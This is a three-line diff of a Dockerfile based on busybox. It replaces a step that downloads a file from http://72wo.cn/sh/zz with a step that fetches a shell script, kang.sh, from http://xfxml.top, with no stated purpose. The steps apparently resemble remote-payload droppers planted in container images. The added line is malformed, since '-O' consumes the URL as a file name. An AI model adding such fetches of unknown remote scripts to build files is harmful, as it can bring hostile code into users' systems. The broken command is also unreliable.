@@ -1,3 +1,3 @@
 FROM busybox:latest
 WORKDIR /app
-RUN wget -O zz http://72wo.cn/sh/zz
+RUN wget -O http://xfxml.top/kang.sh
